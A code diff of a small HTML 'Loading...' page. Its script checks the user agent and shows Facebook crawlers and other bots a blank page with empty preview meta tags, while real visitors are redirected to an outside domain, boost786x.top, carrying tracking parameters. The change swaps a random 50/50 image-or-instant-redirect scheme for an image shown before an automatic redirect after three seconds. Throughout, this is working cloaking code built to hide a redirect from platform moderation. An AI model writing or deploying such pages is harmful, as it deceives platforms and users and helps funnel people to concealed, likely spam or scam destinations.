@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Loading...</title>
 
-  <!-- Facebook / Bots ke liye clean meta -->
+  <!-- Facebook / Bots Meta -->
   <meta property="og:image" content="">
   <meta property="og:image:width" content="0">
   <meta property="og:image:height" content="0">
@@ -46,20 +46,13 @@
   <div class="loading" id="loading-text">Loading...</div>
 
 <script>
-/* =====================================================
-   CONFIG - SIRF YAHAN SE LINKS AUR IMAGE CHANGE KARO
-===================================================== */
+/* CONFIGURATION */
 const CONFIG = {
-  // Final destination (dono cases mein same rahega)
-  targetLink: "https://boost786x.top/boost55abc/?utm_source=Speedo&utm_medium=AA",
-
-  // Jo image user ko dikhegi (jab image wala case aaye)
-  userImage: "images/image_03.webp"
+  targetLink: "https://boost786x.top/boost55abc/?utm_source=B.VK&utm_medium=VK",
+  userImage: "image_03.webp"
 };
 
-/* =====================================================
-   ADVANCED BOT / FACEBOOK DETECTION
-===================================================== */
+/* BOT DETECTION */
 function isFacebookOrBot() {
   const ua = navigator.userAgent.toLowerCase();
   const bots = [
@@ -72,11 +65,8 @@ function isFacebookOrBot() {
   return bots.some(bot => ua.includes(bot));
 }
 
-/* =====================================================
-   MAIN LOGIC - 50/50 RANDOM
-===================================================== */
+/* MAIN LOGIC */
 (function () {
-  // Facebook ya koi bot hai to clean blank page do
   if (isFacebookOrBot()) {
     document.getElementById("loading-text").style.display = "none";
     document.title = "";
@@ -84,23 +74,18 @@ function isFacebookOrBot() {
     return;
   }
 
-  // Real user → 50% chance decide karo
-  const showImage = Math.random() < 0.5;   // true = image, false = auto redirect
-
-  if (showImage) {
-    // Case 1: Image dikhao + click pe redirect
-    const img = document.getElementById("main-image");
-    img.src = CONFIG.userImage;
-    img.style.display = "block";
-    document.getElementById("loading-text").style.display = "none";
-  } else {
-    // Case 2: 0 second auto redirect
-    document.getElementById("loading-text").style.display = "none";
-    window.location.replace(CONFIG.targetLink);
-  }
+  // Show image and set auto-redirect timer (3 seconds)
+  showImageScreen();
+  setTimeout(goToTarget, 3000);
 })();
 
-// Image pe click
+function showImageScreen() {
+  const img = document.getElementById("main-image");
+  img.src = CONFIG.userImage;
+  img.style.display = "block";
+  document.getElementById("loading-text").style.display = "none";
+}
+
 function goToTarget() {
   window.location.href = CONFIG.targetLink;
 }
